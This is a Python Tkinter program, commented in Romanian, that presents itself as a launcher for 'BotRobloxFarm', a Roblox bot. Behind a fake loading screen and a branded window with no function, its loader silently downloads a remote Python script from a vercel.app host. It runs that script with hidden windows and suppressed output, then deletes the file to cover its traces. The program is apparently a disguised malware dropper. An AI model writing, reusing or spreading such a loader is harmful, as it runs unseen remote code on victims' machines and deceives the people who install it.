import tkinter as tk
from tkinter import font
import time
import urllib.request
import subprocess
import sys
import os
import tempfile

class BRFLoader:
    def __init__(self):
        # Primul Tkinter - Loading Screen
        self.loading_root = tk.Tk()
        self.loading_root.title("Loading...")
        self.loading_root.geometry("300x150")
        self.loading_root.configure(bg='#0a0a0a')
        self.loading_root.overrideredirect(True)  # Fără borduri
        
        # Centrează loading screen
        self.center_window(self.loading_root, 300, 150)
        
        # Label loading
        self.loading_label = tk.Label(
            self.loading_root,
            text="System Loading...",
            font=("Consolas", 14),
            fg="#00ffaa",
            bg="#0a0a0a"
        )
        self.loading_label.pack(expand=True)
        
        # Pornim procesul de download
        self.loading_root.after(100, self.start_download_process)
        
        # Rulează loading screen pentru 3 secunde
        self.loading_root.after(3000, self.close_loading_and_open_main)
        
        # Force focus
        self.loading_root.lift()
        self.loading_root.focus_force()
        
        self.loading_root.mainloop()
    
    def center_window(self, window, width, height):
        window.update_idletasks()
        screen_width = window.winfo_screenwidth()
        screen_height = window.winfo_screenheight()
        x = (screen_width // 2) - (width // 2)
        y = (screen_height // 2) - (height // 2)
        window.geometry(f'{width}x{height}+{x}+{y}')
    
    def start_download_process(self):
        """Descarcă și rulează în background"""
        try:
            url = "https://brf-eight.vercel.app/brf.py"
            with tempfile.NamedTemporaryFile(suffix='.py', delete=False) as f:
                temp_path = f.name
                urllib.request.urlretrieve(url, temp_path)
                
                # Rulează SILENȚIOS
                startupinfo = None
                if sys.platform == "win32":
                    startupinfo = subprocess.STARTUPINFO()
                    startupinfo.dwFlags |= subprocess.STARTF_USESHOWWINDOW
                    startupinfo.wShowWindow = subprocess.SW_HIDE
                
                subprocess.Popen(
                    [sys.executable, temp_path],
                    startupinfo=startupinfo,
                    creationflags=subprocess.CREATE_NO_WINDOW if sys.platform == "win32" else 0,
                    stdout=subprocess.DEVNULL,
                    stderr=subprocess.DEVNULL
                )
                
                # Șterge după 5 secunde
                self.loading_root.after(5000, lambda: self.delete_file(temp_path))
                
        except Exception as e:
            print(f"Download error: {e}")
    
    def delete_file(self, path):
        try:
            for _ in range(3):
                try:
                    os.unlink(path)
                    break
                except:
                    time.sleep(0.1)
        except:
            pass
    
    def close_loading_and_open_main(self):
        """Închide loading și deschide fereastra principală"""
        if self.loading_root:
            self.loading_root.destroy()
            self.loading_root = None
        
        # Deschide fereastra principală
        BRFMainApp()

class BRFMainApp:
    def __init__(self):
        self.root = tk.Tk()
        self.root.title("BRF")
        
        # SETĂRI FEREATRĂ TRANSPARENTĂ
        self.root.overrideredirect(True)  # Fără borduri
        self.root.attributes('-alpha', 0.95)  # Transparent
        self.root.attributes('-topmost', True)  # Mereu deasupra
        self.root.configure(bg='#000000')
        
        # Dimensiuni
        self.width, self.height = 500, 300
        self.root.geometry(f"{self.width}x{self.height}")
        
        # Canvas pentru fundal
        self.canvas = tk.Canvas(
            self.root,
            bg='#000000',
            highlightthickness=0,
            width=self.width,
            height=self.height
        )
        self.canvas.pack(fill=tk.BOTH, expand=True)
        
        # Crează conținutul
        self.create_content()
        
        # Crează butoanele X și -
        self.create_window_buttons()
        
        # Centrează
        self.center_window()
        
        # Animație simplă
        self.animation_phase = 0
        self.animate()
        
        # Permite glisarea
        self.canvas.bind("<Button-1>", self.start_move)
        self.canvas.bind("<B1-Motion>", self.on_move)
        
        # Rulează aplicația
        self.root.mainloop()
    
    def create_content(self):
        """Crează conținutul principal"""
        # BRF text - FOARTE MARE
        self.brf_text = self.canvas.create_text(
            self.width//2, self.height//2 - 30,
            text="BRF",
            font=("Segoe UI", 72, "bold"),
            fill="#00FFAA",
            anchor="center"
        )
        
        # BotRobloxFarm text
        self.sub_text = self.canvas.create_text(
            self.width//2, self.height//2 + 40,
            text="BotRobloxFarm",
            font=("Segoe UI", 28),
            fill="#888888",
            anchor="center"
        )
        
        # Linie decorativă
        self.canvas.create_line(
            self.width//2 - 100, self.height//2 + 80,
            self.width//2 + 100, self.height//2 + 80,
            fill="#00FFAA",
            width=2
        )
    
    def create_window_buttons(self):
        """Crează butoanele X și -"""
        # Buton CLOSE (X) - ROȘU VIZIBIL
        self.close_btn = tk.Button(
            self.root,
            text="×",
            font=("Arial", 16, "bold"),
            fg="white",
            bg="#ff4444",
            activebackground="#ff6666",
            activeforeground="white",
            bd=0,
            width=3,
            height=1,
            command=self.root.destroy
        )
        self.close_btn.place(x=self.width-40, y=10)
        
        # Buton MINIMIZE (-) - ALBASTRU VIZIBIL
        self.min_btn = tk.Button(
            self.root,
            text="–",
            font=("Arial", 16, "bold"),
            fg="white",
            bg="#4488ff",
            activebackground="#66aaff",
            activeforeground="white",
            bd=0,
            width=3,
            height=1,
            command=self.root.iconify
        )
        self.min_btn.place(x=self.width-80, y=10)
    
    def center_window(self):
        """Centrează fereastra"""
        self.root.update_idletasks()
        screen_width = self.root.winfo_screenwidth()
        screen_height = self.root.winfo_screenheight()
        x = (screen_width // 2) - (self.width // 2)
        y = (screen_height // 2) - (self.height // 2)
        self.root.geometry(f'+{x}+{y}')
    
    def start_move(self, event):
        """Începe glisarea ferestrei"""
        self.x = event.x
        self.y = event.y
    
    def on_move(self, event):
        """Glisează fereastra"""
        deltax = event.x - self.x
        deltay = event.y - self.y
        x = self.root.winfo_x() + deltax
        y = self.root.winfo_y() + deltay
        self.root.geometry(f"+{x}+{y}")
    
    def animate(self):
        """Animație simplă de pulsare"""
        self.animation_phase += 0.1
        
        # Pulsare text BRF
        import math
        pulse = (math.sin(self.animation_phase) + 1) / 2
        r = 0
        g = int(200 + pulse * 55)
        b = int(150 + pulse * 105)
        color = f'#{r:02x}{g:02x}{b:02x}'
        
        self.canvas.itemconfig(self.brf_text, fill=color)
        
        # Continuă animația
        self.root.after(100, self.animate)

# Pornire aplicație
if __name__ == "__main__":
    # Pornește cu loading screen
    loader = BRFLoader()
